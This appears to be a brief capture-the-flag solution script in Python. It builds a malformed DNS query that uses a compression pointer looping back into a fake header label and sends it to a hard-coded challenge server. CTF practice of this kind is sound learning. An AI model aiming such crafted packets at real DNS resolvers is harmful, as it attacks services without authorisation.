### Compile DNS packet ###
header = b'\x03com\x00\x01\x00\x00\x00\x00\x00\x00'
qname = b'\x04free\x04flag\x03for\x04flag\x06loving\x04flag\x09capturers\x0cdownunderctf\xc0\x00'
end = b'\x00\x10\x00\x01'

dns_packet = header + qname + end
print(len(dns_packet))


### Send DNS packet ###
import socket

UDP_IP = "34.82.169.203"
UDP_PORT = 8053
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(dns_packet, (UDP_IP, UDP_PORT))


### Receive DNS response ###
data, addr = sock.recvfrom(1024)
print(data)